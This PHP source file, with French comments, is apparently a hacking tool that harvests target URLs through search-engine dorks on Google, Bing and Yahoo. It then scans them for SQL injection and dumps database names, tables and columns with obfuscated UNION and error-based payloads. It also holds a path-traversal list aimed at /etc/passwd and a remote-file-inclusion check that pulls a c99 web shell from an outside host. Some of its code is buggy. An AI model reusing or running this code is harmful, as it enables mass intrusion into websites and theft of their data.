<?php
/**
* Scanneur Classe
**/
if (!function_exists('curl_init')){
    die('<b>Désolé cURL n\'est pas installer!</b>');
}
class Curl
{
	public function get($url)
	{
		$ch = new chaine();
		$curl = curl_init();
		curl_setopt($curl, CURLOPT_URL, $url);
		curl_setopt($curl, CURLOPT_TIMEOUT, 50);
		curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
		curl_setopt($curl,CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl,CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($curl,CURLOPT_RETURNTRANSFER, true);
		$output = curl_exec($curl);
		curl_close ($curl);
		return $output;
	}
}
class Rechercheur
{
	//**************************************Controlleur*********************************************
	public function allEngine($dork, $page)
	{
		$save = new Sauvegardeur();
		$rs = "";
		$rs .= $this->_google_exe($dork, $page);
		$rs .= $this->_bing_exe($dork, $page);
		$rs .= $this->_yahoo_exe($dork, $page);
		$save->saveListeUrl($rs);
		$this->SuprimerVide();
		return $rs;
	}
	public function  google($dork, $page)
	{
		$save = new Sauvegardeur();
		$resultat = $this->_google_exe($dork, $page);
		$save->saveListeUrl($resultat);
		$this->SuprimerVide();
		return $resultat;
	}
	public function bing($dork, $page)
	{
		$save = new Sauvegardeur();
		$resultat = $this->_bing_exe($dork, $page);
		$save->saveListeUrl($resultat);
		$this->SuprimerVide();
		return $resultat;
	}
	public function yahoo($dork, $page)
	{
		$save = new Sauvegardeur();
		$resultat = $this->_yahoo_exe($dork, $page);
		$save->saveListeUrl($resultat);
		$this->SuprimerVide();
		return $resultat;
	}
	//******************************************DELETE EMPTY******************************************************
	private function SuprimerVide()
	{
		if(($cle = array_search("", $_SESSION["url_trouver"])) !== false) 
		{
		    unset($_SESSION["url_trouver"][$cle]);
		}
	}
	//**********************************exe order**********************************************************************
	private function  _google_exe($dork, $page)
	{
		$_url_base = 'https://www.google.fr/search?q='.urlencode($dork).'&start=PAGE';
		$req = new Curl();
		$ext = new Extracteur();
		$list_url = "";
		$page = intval($page."0");
		$p = 0;
		while ($p <= $page) 
		{
			$url = str_replace("PAGE", $p, $_url_base);
			$code = $req->get($url);
			$list_url .= $ext->google($code);
			$p += 10;
		}	
		return $list_url;
	}
	private function _bing_exe($dork, $page)
	{
		$_url_base = 'http://www.bing.com/search?q='.urlencode($dork).'&first=PAGE';
		$req = new Curl();
		$ext = new Extracteur();
		$list_url = "";
		$p = 0;
		while ($p <= $page) 
		{
			$url = str_replace("PAGE", $p, $_url_base);
			$code = $req->get($url);
			$list_url .= $ext->bing($code);
			$p++;
		}	
		return $list_url;
	}
	private function _yahoo_exe($dork, $page)
	{
		$_url_base = 'http://search.yahoo.com/search?p='.urlencode($dork).'&xargs=0&b=PAGE';
		$req = new Curl();
		$ext = new Extracteur();
		$list_url = "";
		$page = intval($page."1");
		//$page doit rajoute un 2 car sa va exemple: 1-11-21-31-41
		$p = 1;
		while ($p <= $page) 
		{
			$url = str_replace("PAGE", $p, $_url_base);
			$code = $req->get($url);
			$list_url .= $ext->yahoo($code);
			$p += 10;
		}	
		return $list_url;
	}
}
class Extracteur
{
	public $separateur = "\r\n";

	private function getLinks($links)
	{
		$ret = array();
		$dom = new domDocument;
		@$dom->loadHTML(file_get_contents($link));
		$dom->preserveWhiteSpace = false;
		$links = $dom->getElementsByTagName('a');
		foreach ($links as $tag) 
		{ 
			$ret[$tag->getAttribute('href')] = $tag->childNodes->item(0)->nodeValue; 
		}
		return $ret;
	}
	private function RepareGog($url)
	{
		$url = $this->Decode($url);
		$url = str_replace("/url?q=", "", $url);
		$arrfin = explode("&sa=", $url);
		$url = $arrfin[0];
		return html_entity_decode(urldecode($url));
	}
	public function RepareYahoo($url)
	{
		$url = $this->Decode($url);
		$url = str_replace("<b>", "", $url);
		$url = str_replace("<wbr />", "", $url);
		$url = str_replace("</b>", "", $url);
		$url = "http://".$url;
		return html_entity_decode(urldecode($url));
	}
	private function Decode($str)
	{
		return html_entity_decode(urldecode($str));
	}
  private function getNomDom($url)
  {
  	$u = explode('/', $url);
  	return $u[2];
  }
  public function BlackList($url)
  {
    $black = array(
      "google", 
      "msn", 
      "yahoo", 
      "ebay", 
      "youtube", 
      "facebook", 
      "twitter",
      "github",
      "pastebin.com",
      "stackoverflow.com",
	  ".phpni.",
      "php.net",
    );
    $ok = false;
    foreach($black as $element)
    {
      if(strpos($url, $element) !== false)
      {
        $ok = true;
        break;
      }
    }
    return $ok;
  }
    public function VerfierURL($url)
	{
	    $domUrl = $this->getNomDom($url);
	    if((!$this->VerfierExistDom($domUrl)) && (!$this->BlackList($url)))
	    {
	      if(isset($_POST["btn_url_with_param"]) && $_POST["btn_url_with_param"] == "1")
	      {
	        if((strpos('?', $url) !== false) && (strpos('=', $url) !== false))
	        {
	          return true; }
	        else {
	          return false;
	        }
	      }
	      else
	      {
	        return true;
	      }
	    }
	}
  public function VerfierExistDom($dom)
  {
  	$ok = false;
  	if(isset($_SESSION["url_trouver"])) {
	    $Urls = $_SESSION["url_trouver"];
	    foreach ($Urls as $element) 
	    {
	        if(!empty($element) && strpos($dom, $element) !== false) 
	        {
	          $ok = true;
	          break;
	        } else { }
	    }
	}
    return $ok;
  }
	public function google($code)
	{
		preg_match_all("@<h3\s*class=\"r\">\s*<a[^<>]*href=\"([^<>]*)\"[^<>]*>(.*)</a>\s*</h3>@siU", $code, $matches);
		$i = 0;
		$n = count($matches[1]);
		$Urls = '';
		while($i < $n) 
		{
			$url = trim($matches[1][$i]);
			$url = $this->RepareGog($url);
	      $domUrl = $this->getNomDom($url);
	      if(!strpos($Urls, $domUrl) !== false)
	      {
	        if($this->VerfierURL($url))
	        {
	           $Urls .= $url."\r\n";
	        }
	      }
			$i++;
			flush();
		}

		return $Urls;
	}
	public function bing($page)
	{
		preg_match_all("/<h2><a href=\"(.*?)\"/", $page, $output_array);
		$i = 0;
		$n = count($output_array[1]);
		$Urls = '';
		while($i < $n) 
		{
			$url = urldecode(trim($output_array[1][$i]));
	      	$domUrl = $this->getNomDom($url);
	      	if(!strpos($Urls, $domUrl) !== false)
	      	{
	        	if($this->VerfierURL($url))
	        	{
	           		$Urls .= $url."\r\n";
	        	}
	      	}
			$i++;
			flush();
		}
		return $Urls;
	}
	public function yahoo($page)
	{
		preg_match_all("/fw-m fc-12th wr-bw\">(.*?)<\/span>/", $page, $output_array);
		$i = 0;
		$n = count($output_array[1]);
		$Urls = '';
		while($i < $n) 
		{
			$url = urldecode(trim($output_array[1][$i]));
			$url = $this->RepareYahoo($url);
	      	$domUrl = $this->getNomDom($url);
	      	if(!strpos($Urls, $domUrl) !== false)
	      	{
	        	if($this->VerfierURL($url))
	        	{
	           		$Urls .= $url."\r\n";
	        	}
	      	}
			$i++;
			flush();
		}
		return $Urls;
	}
}
class Sauvegardeur
{
	public $Dossier = "File_URL";

	public function saveListeUrl($liste_url)
	{
		/*if(strlen($liste_url) > 0) {
			$chemin = "/liste_url_".$_SESSION["nomutilisateur"].".txt";
			$file = fopen($chemin, "w") or die("Unable to open file!");
			fwrite($file, $liste_url);
			fclose($file);
		}*/
	}
	public function saveListeFaille($liste_url)
	{
		/*if(strlen($liste_url) > 0) {
			$filename = "/liste_url_exploitable_".$_SESSION["nomutilisateur"].".txt";
			$file = fopen($this->Dossier.$filename, "w") or die("Unable to open file!");
			fwrite($file, $liste_url);
			fclose($file);
		}*/
	}
}
class Scanneur 
{ 
	public function Scanne($array_url)
	{
		$resultat = "";
		$nbr_elmt = count($array_url);
		$e = '';
		foreach ($array_url as $key => $url) 
		{
			$e .= $url;
			if($url != "") 
			{
				$this->SuprimerDansTrv($url);
				if($this->sql($url))
				{
					$resultat .= $url . "\r\n";
				}
			}
		}
		$_SESSION["erreur"] = $e;
		$this->SuprimerDansTrv("");
		return $resultat;
	}

	private function SuprimerDansTrv($str)
	{
		if(($cle = array_search($str, $_SESSION["url_trouver"])) !== false) 
		{
		    unset($_SESSION["url_trouver"][$cle]);
		}
	}

	private function lfi($url) 
	{
		$req = new Curl();
		$lfifound = 0;
		$lfi = array("/etc/passwd",
				"../etc/passwd",
				"../../etc/passwd",
				"../../../etc/passwd",
				"../../../../etc/passwd",
				"../../../../../etc/passwd",
				"../../../../../../etc/passwd",
				"../../../../../../../etc/passwd",
				"../../../../../../../../etc/passwd",
				"../../../../../../../../../etc/passwd",
				"../../../../../../../../../../etc/passwd",
				"/etc/passwd%00",
				"../etc/passwd%00",
				"../../etc/passwd%00",
				"../../../etc/passwd%00",
				"../../../../etc/passwd%00",
				"../../../../../etc/passwd%00",
				"../../../../../../etc/passwd%00",
				"../../../../../../../etc/passwd%00",
				"../../../../../../../../etc/passwd%00",
				"../../../../../../../../../etc/passwd%00",
				"../../../../../../../../../../etc/passwd%00");

		$totallfi = count($lfi); 
		for($i = 0; $i < $totallfi; $i++) 
		{ 
			$url_t = $site.$lfi[$i];
			$page = $req->get($url_t); 
			if (preg_match("/root/i",$page, $matches)) 
			{ 
				echo "LFI trouver: $site$lfi[$i]<br>"; 
				$lfifound = 1; 
			}
		}
		if ($lfifound == 0) 
		{ 
			echo "Pas de LFI trouver.<br>"; 
		} 
	}
	private function rfi($url)
	{

		$rfifound = 0;
		$req = new Curl();
		$rfi = "http://fastdata.altervista.org/Hck/c99madshell_v2.1.php.php.txt?"; //c99madshell_v2.1.php.php.txt? 
		$url_t = $url.$rfi;
		$page = $req->get($url_t);

		if (preg_match("/root/i", $page, $matches)) 
		{
			return true;
			$rfifound = 1;
		} 
		if ($rfifound == 0) 
		{
			return false;
		}
	}
	private function sql($url)
	{
		if (!strpos($url, "=") !== false)
        {
            return false;
        }
        else
        {
            $sqli = new sqli_check();
            if($sqli->demmareAnalyseFast($url))
            {
                return true;
            }
            else
            {
                return false;
            }
        }
	}
}
/**
* sqli_inject
*/
class sqli_inject
{
	function __construct()
	{
		$this->hr = new Curl();
		$this->ch = new chaine();
	}
	private $_url_originale;
    private $_url_base;
    private $_nbr_colonne;
    private $_colonne_point;
    private $_param = Array();
    private $hr;
    private $ch;
    private $baseI = "(select 1 from(select count(*),concat((select (select [t]) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)";
    private $separateur = "!~!";
    private $s_separateur = "'~!'";
    private $_union = array(
        "999999.9 union all select [t]",
        "999999.9 union all select [t]--",
        "999999.9' union all select [t] and '0'='0",
        "999999.9\" union all select [t] and \"0\"=\"0",
        "999999.9) union all select [t] and (0=0",
        "9' and [t] '1'=1",
        "9' or 1=[t] and '1'=1",
        "999999.9 union all select [t] #",
        "999999.9 union all select [t]-- #",
        "999999.9\" union all select [t] and \"0\"=\"0 #",
        "999999.9' union all select [t] and '0'='0 #",
        "999999.9) union all select [t] and (0=0) #",
    );
    public function Analyse($url)
    {
        $vrf = new sqli_check();
        $colonne = new sqli_colonne();
        $inj_point = "";
        $inj_point_curr = "";
        $point_trv = false;
        $_url_originale = $url;
        $_url_base = current(explode('?', $url));
        $this->_param = $this->ch->analyseParam($url);

        if ($vrf->demmareAnalyseFast($url) || $vrf->demmareAnalyseAvanced($url))
        {
            $u = 0; //Union Style 1
            while (!$point_trv && $u < count($this->_union))
            {
                $_nbr_colonne = $colonne->Compter($this->_param, $_url_base, $this->_union[$u]);
                for ($p = 0; $p <= count($this->_param); $p++)
                {
                	//echo "la ==><br>";
                    $this->_colonne_point = $colonne->FindColonneVise($_url_base . 
                    		$this->ch->escapeParam($this->ch->genParamParIndex($this->_param, 0, $p + 1)) . 
                    			str_replace("[t]", $this->ch->genNbrColonneVise($_nbr_colonne, $this->_colonne_point), $this->_union[$u]) . 
                    				$this->ch->genParamParIndex($this->_param, $p + 1, count($this->_param)), $_nbr_colonne);
                    echo "Colonne Vise ==>".$this->_colonne_point."<br>";

                    $inj_point = $_url_base . $this->ch->Encode($this->ch->escapeParam($this->ch->genParamParIndex($this->_param, 0, $p + 1)) . 
                    	str_replace("[t]", $this->ch->genNbrColonneVise($_nbr_colonne, $this->_colonne_point), $this->_union[$u]) . 
                    		$this->ch->genParamParIndex($this->_param, $p + 1, count($this->_param)));
                    echo "==>".$inj_point."<br>";

                    $inj_point_curr = str_replace("[t]", $this->ch->Encode("concat(" . 
                    		$this->ch->getHex($this->separateur) . ",concat(user()," . 
                    			$this->ch->getHex($this->s_separateur) . ",version()," . $this->ch->getHex($this->s_separateur) . 
                    			",database())," . $this->ch->getHex($this->separateur) . ")"), $inj_point);
                    echo "==>".$inj_point_curr."<br>";

                    $page = $this->hr->get($inj_point_curr);
                    if (strpos($page, $this->separateur) !== false || strpos($page, $this->s_separateur) !== false)
                    {
                        $this->setResult($page, $inj_point);
                        $point_trv = true;
                        break;
                    }
                    else
                    {
                        $_SESSION["result_analyse"] = "injection echouer pas de resultat ! \r\n";
                    }
                }
                $u++;
            }
        }
        else
        {
        	echo "Injection echouer";
        	$_SESSION["result_analyse"] = "Injection echouer char: ' \r\n";
        } 
    }
    private function setResult($page, $url_point)
    {
    	$_SESSION["page_analyse"] = $page;
        $result = $this->ch->extResult($this->separateur, $page);
        $_SESSION["result_analyse"] = "Injection point: ". $url_point . "<br>" . "Result: " . $result;
		exit;
		echo "Success";
    }
}

/**
* sqli_counter
*/
class sqli_colonne
{
	function __construct()
	{
		$this->hr = new Curl();
		$this->ch = new chaine();
	}
    private $syntax_count = "9136665621.9";
    private $okstr = "QUADCOREENGINE666";
    private $var_n = "[t]";
    private $hr;
    private $ch;

	public function Compter($param, $url_base, $union)
    {
        for ($p = 0; $p < count($param); $p++)
        {
            for ($i = 0; $i <= 60; $i++)
            {
                $url_curr = $url_base . $this->ch->ViderDernierParam($this->ch->genParamParIndex($param, 0, ($p + 1))) .
	                $this->ch->Encode(str_replace($this->var_n, $this->GenSynHex($i), $union)) . 
	                $this->ch->genParamParIndex($param, $p + 1, count($param));
                $page = $this->hr->get($url_curr);
                if (strpos($page, $this->syntax_count) !== false)
                {
                    return $i;
                }
            }
        }
        return 0; 
    }
    public function FindColonneVise($url, $maxColonne)
    {
        $chkstr = "concat(0x217e21," . $this->var_n . ",0x217e21)";//concat(0x217e21,0x51554144434f5245454e47494e45363636,0x217e21)
        $url_f = "";
        $_url_base = explode('?', $url);
        $_url_base = $_url_base[0];
        $_url_params = explode('?', $url);
        $_url_params = "?" . $_url_params[1];

        for ($i = 0; $i <= $maxColonne + 1; $i++)
        {
            $param = $this->ch->Encode(str_replace($this->var_n, $this->ch->getHex($this->okstr), $chkstr));
			$url_f = $_url_base . urlencode(preg_replace('/'.$i.'/', $param, $_url_params, 1));
            $page = $this->hr->get($url_f);
            if (strpos($page, $this->okstr) !== false)
            {
                return $i;
            }
            $page = "";
        }
        return -1;
    }
    private function GenSynHex($index)
    {
        $concat = "";
        for ($i = 0; $i <= $index; $i++)
		{
            if ($i + 1 > $index)
		        $concat .= $this->ch->getHex($this->syntax_count);
            else
                $concat .= $this->ch->getHex($this->syntax_count) . ",";
		}
        return $concat;
    }
}

/**
* sqli_check
*/
class sqli_check
{
	function __construct()
	{ $this->ch = new chaine(); $this->hr = new Curl(); }
    private $_param = Array();
    private $var_n = "[t]";
    private $baseI = "(select 1 from(select count(*),concat((select(select [t]) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)";
    private $baseF = "unhex(hex(concat([t])))"; //0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21
    private $testSTR = "QUADCOREEE66615";
    private $sqli = "'A=0";
    private $separateur = "!~!";
    private $hr;
    private $ch;

    public function demmareAnalyseFast($url)
    {
        $url_racine = current(explode("?", $url));
        $_param = $this->ch->analyseParam($url);
        for ($i = 0; $i < count($_param); $i++)
        {
            $url_c = $url_racine . $this->ch->genParamParIndex($_param, 0, $i + 1) . $this->sqli . $this->ch->genParamParIndex($_param, $i + 1, count($_param));
            $page = $this->hr->get($url_c);
	        if (preg_match("/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch_row()|SELECT * FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i",$page, $matches) || strpos($page, 'You have an error in your SQL syntax') !== false) 
			{ 
				return true;
			} 
			else
			{ 
				return false;
			}
        }
        return false; 
    }
    public function demmareAnalyseAvanced($url)
    {
        $url_racine = current(explode('?', $url));
        $_param = $this->ch->analyseParam($url);

        $param_curr = str_replace($this->var_n, str_replace($this->var_n, $this->ch->getHex($this->separateur) . "," . $this->ch->getHex($this->testSTR) . "," . $this->ch->getHex($this->separateur), $this->baseF), $this->baseI);

        for ($i = 0; $i < count($_param); $i++)
        {
            $url_c = $url_racine . $this->ch->ViderDernierParam($this->ch->genParamParIndex($_param, 0, $i + 1)) . $this->ch->Encode($param_curr) . $this->ch->genParamParIndex($_param, $i + 1, count($_param));
            $page = $this->hr->get($url_c);
            if (strpos($page, $this->testSTR) !== false)
            {
                return true;
            }
        }
        return false;
    }
    public function fichierLoad($url)
    {
        $inj = "(select concat(0x217e21,ifnull(load_file(0x2f6574632f706173737764),char(32)),0x332150,ifnull(length(load_file(0x2f6574632f706173737764)),char(32)),0x217e21) )";
    }

    private function verifPage($page)
    {
    	if (preg_match("/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()
			|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch_row()|SELECT * FROM|supplied argument is not a valid MySQL
			|Syntax error|Fatal error/i",$page, $matches) || strpos($page, 'You have an error in your SQL syntax') !== false) 
		{ 
			return true;
		} 
		else
		{ 
			return false;
		}
    }
}

/**
* sqli_dump
*/
class sqli_dump
{
	function __construct()
	{
		$this->hr = new Curl();
		$this->ch = new chaine();
	}
	private $separateur = "!~!";
    private $s_separateur = "3!P";
    private $var_n = "[t]";
    private $hr;
    private $ch;
    private $_url_point;
    public function controlleur($url)
    {
        $this->_url_point = $this->ch->Encode($url);
        if(setInfos())
        {
            return true;
        }
        else { return false; }
    }
    public function setInfos()
    {
        $oo = new Outils();
        $url_g = str_replace($this->var_n, "concat(" . $this->ch->getHex($this->separateur) . ",concat(user()," . $this->ch->getHex($this->s_separateur) . ",version()," . $this->ch->getHex($this->_separateur) . ",database())," . $this->ch->getHex($this->separateur) . ")", $this->_url_point);
        $page = $this->hr->get($url_g);
        if (strpos($page, $this->separateur) !== false)
        {
            $rslt = $this->ch->extSubResult($this->s_separateur, $this->ch->extResult($this->separateur, $page));
            $hote = explode('/', $this->_url_point);
            $ip = $oo->avoirip($hote[2]);
            setBD($rslt[2]);
            $_SESSION["analyse_infos"] = $rslt."'~!'".$ip;

            /* form_principale.txt_user.Text = rslt[0];
            form_principale.txt_version.Text = rslt[1];
            form_principale.txt_ipserveur.Text = ip; */
           
            return true;
        }
        else
        {
            return false;
        }
    }
    private function setBD($bd)
    {
        $_SESSION["basededonnes"] = $bd;
    }
    private function setAllBD()
    {
        $nbr = 0;
        try { $nbr = getNombreDB(); }
        catch (Exception $e) { } 
        $inj = "(select distinct concat(" . $this->ch->getHex($separateur) . ",group_concat(schema_name)," . $this->ch->getHex($this->separateur) . ") from information_schema.schemata where not schema_name=" . $this->ch->getHex("information_schema") . ")";
        $url_f = str_replace($this->var_n, $this->ch->Encode($inj), $this->_url_point);
        $page = $this->hr->get($url_f);
        $dbbrut = $this->ch->extResult($separateur, $page);

        if ($dbbrut != "")
        {
            if ($nbr > 1)
            {
                $basededonnes = explode(',', $dbbrut);
                $groupeBD = "";
                foreach ($basededonnes as $bd)
                {
                    if ($bd != "")
                    {
                    	$groupeBD .= $bd . "\r\n";
                    }
                }
                $_SESSION["basededonnes"] = $groupeBD;
            }
            else
            {
            	$_SESSION["basededonnes"] = $dbbrut."\r\n";
            } 
        }
    }
    private function setTable($db_name, $node_i)
    {
        $nbr = 0;
        try { $nbr = getNombreTable($db_name); }
        catch (Exception $e) { }
        //(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/gRoUp_cOnCaT(/**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/tAbLeS /**/wHeRe /**/tAbLe_sChEmA=0x6d6f64656c73686f5f6462)
        $inj = "(select distinct concat(" . $this->ch->getHex($separateur) . ",unhex(Hex(cast(group_concat(table_name) as char)))," . $this->ch->getHex($separateur) . ") from information_schema.tables where table_schema=" . $this->ch->getHex($db_name) . ")";
        $url_f = str_replace($this->var_n, $this->ch->Encode($inj), $this->_url_point);
        $page = $this->hr->get($url_f);
        $tablebrut = $this->ch->extResult($separateur, $page);

        if ($nbr > 1)
        {
            $tables = explode(',', $tablebrut);
            $groupeTable = "";
            foreach ($tables as $table)
            {
                if ($table != "")
                {
                    $groupeTable .= $table . "\r\n";
                }
            }
            $_SESSION["tables"] = $groupeTable;
        }
        else
        {
            $_SESSION["tables"] = $tablebrut . "\r\n";
        }
    }
    private function setColonne($db_name, $table_name, $node_d_i, $noe_t_i )
    {
    	$nbr = 0;
        try { $nbr = getNombreColonne($db_name, $table_name); }
        catch (Exception $e) { } 
        $inj = "(select distinct concat(" . $this->ch->getHex($this->separateur) . ",unhex(Hex(cast(group_concat(column_name) as char)))," . $this->ch->getHex($this->separateur) . ") from information_schema.columns where table_schema=" . $this->ch->getHex($db_name) . " and table_name=" . $this->ch->getHex($table_name) . ")";
        $url_f = str_replace($this->var_n, $this->ch->Encode($inj), $this->_url_point);
        $page = $this->hr->get($url_f);
        $colonnebrut = $this->ch->extResult($this->separateur, $page);

        if ($nbr > 1)
        {
            $colonnes = explode(',', $colonnebrut);
            $colonneGroupe = "";
            foreach ($colonnes as $colonne)
            {
                if ($colonne != "")
                {
                	$colonneGroupe .= $colonne."\r\n";
                }
            }
            $_SESSION["colonnes"] = $colonneGroupe;
        }
        else
        {
            $_SESSION["colonnes"] = $colonnebrut."\r\n";
        }
    }
    private function getNombreColonne($db_name, $tb_name)
    {
        $inj = "(select concat(" . $this->ch->getHex($separateur) . ",count(0)," . $this->ch->getHex($this->separateur) . ") from information_schema.columns where table_schema=" . $this->ch->getHex($db_name) . " and table_name=".$this->ch->getHex($tb_name).")";
        $url_f = str_replace($this->var_n, $this->ch->Encode($inj), $this->_url_point);
        $page = $this->hr->get($url_f);
        return intval($this->ch->extResult($this->separateur, $page));
    }
    private function getNombreTable($db_name)
    {
        $inj = "(select concat(" . $this->ch->getHex($separateur) . ",count(0)," . $this->ch->getHex($separateur) . ") from information_schema.tables where table_schema=" . $this->ch->getHex($db_name) . ")";
        $url_f = str_replace($this->var_n, $this->ch->Encode($inj), $this->_url_point);
        $page = $this->hr->get($url_f);
        return intval($this->ch->extResult($this->separateur, $page));
    }
    private function getNombreDB()
    {
        $inj = "(select concat(" . $this->ch->getHex($separateur) . ",count(0)," . $this->ch->getHex($separateur) . ") from information_schema.schemata where not schema_name=" . $this->ch->getHex("information_schema") . ")";
        $url_f = str_replace($this->var_n, $this->ch->Encode($inj), $this->_url_point);
        $page = $this->hr->get($url_f);
        return intval($this->ch->extResult($this->separateur, $page));
    }
}

/**
* chaine
*/
class chaine
{
	public function genParamParIndex($_param, $start = 0, $fin = -1)
    {
        $bind = "";
        for ($i = $start; $i < $fin; $i++)
        {
        	if(isset($_param[$i]))
        	{
	            if ($i == 0) 
	            	{ $bind .= $_param[$i]; }
	            else 
	            	{ $bind .= "&" + $_param[$i]; }
        	}
        }
        return $bind;
    }
    public function ViderDernierParam($param)
    {
        $bind = "";
        $_param = array();
        $Tparam = explode('?', $param);
        $Tparam = "?" . $Tparam[1];
        $pa = explode("&", $Tparam);
        $_param = $pa;
        for ($i = 0; $i < count($_param); $i++)
        {
            if ($i + 1 == count($_param))
            {
                $bind .= $this->escapeParam($_param[$i]);
            }
            else //(i == 0 && i != _param.Count)
            {
                $bind .= $_param[$i];
            }
        }
        return $bind;
    }
    public function analyseParam($url)
    {
        $_param = array();
        if (strpos($url, '?') !== false)
        {
        	$Tparam = explode('?', $url);
        	$Tparam = "?" . $Tparam[1];
            $param = explode('&', $Tparam);
            $_param = $param;
        }
        return $_param;
    }
    public function escapeParam($param)
    {
        return current(explode('=', $param)) . "=";
    }
    public function genNbrColonneVise($nbr_table, $index_var = -1)
    {
        $bind = "";
        for ($i = 1; $i <= $nbr_table + 1; $i++)
        {
            if ($i + 1 > $nbr_table + 1) 
            { 
                $bind .= $i; 
            }
            else if ($i == $index_var)
            {
                $bind .= "[t],";
            }
            else 
            { 
                $bind .= $i . ","; 
            }
        }
        return $bind;
    }
    public function extResult($separateur, $page)
    {
        $result = "";
        if(strpos($page, $separateur) !== false)
        {
            $result = explode($separateur, $page);
            return $result[1];
        }
        else
        {
            return "";
        }
    }
    public function extSubResult($s_separateur, $page)
    {
        $result = array();
        if (strpos($page, $separateur) !== false)
        {
            $result = explode($s_separateur, $page);
            return $result;
        }
        else
        {
            return $result;
        }
    }
    public function Encode($url)
    {
        $com = "%2f**%2f";
        $url = str_replace("select", $com . "sElEcT",$url);
        $url = str_replace("from", $com . "fRoM",$url);
        $url = str_replace("union", $com . "uNiOn",$url);
        $url = str_replace("group_concat", $com . "gRoUp_cOnCaT",$url);
        $url = str_replace("concat", $com . "cOnCaT",$url);
        $url = str_replace("limit", $com . "lImIt",$url);
        $url = str_replace("group by", $com . "gRoUp" . $com . "bY",$url);
        $url = str_replace("unhex", $com . "uNhEx",$url);
        $url = str_replace("hex", $com . "hEx",$url);
        $url = str_replace("schemata", $com . "sChEmAtA",$url);
        $url = str_replace("table_name", $com . "tAbLe_nAmE",$url);
        $url = str_replace("table_schema", $com . "tAbLe_sChEmA",$url);
        $url = str_replace("tables", $com . "tAbLeS",$url);
        $url = str_replace("column_name", $com . "cOlUmN_NaMe",$url);
        $url = str_replace("columns", $com . "cOlUmNs",$url);
        $url = str_replace("version", $com . "vErSiOn",$url);
        $url = str_replace("distinct", $com . "dIsTiNcT",$url);
        $url = str_replace("all", $com . "aLl",$url);
        $url = str_replace("user", $com . "uSeR",$url);
        $url = str_replace("database", $com . "dAtAbAsE",$url);
        $url = str_replace("  ", " ",$url);
        $url = str_replace(" ", "+",$url);
        return $url;
    }
    public function getHex($str)
    {
        $hex = '';
    	for ($i=0; $i<strlen($str); $i++)
    	{
	        $ord = ord($str[$i]);
	        $hexCode = dechex($ord);
	        $hex .= substr('0'.$hexCode, -2);
	    }
    	return "0x".strtolower($hex);
    }
    public function getStringHex($hex)
    {
        $string='';
	    for ($i=0; $i < strlen($hex)-1; $i.=2){
	        $string .= chr(hexdec($hex[$i].$hex[$i+1]));
	    }
	    return $string;
    }
}
/**
* SQLI_check_class
*/
/**
* BY QuadCore ENGINE 666 /-\
* banncorx@gmail.com
*/
?>
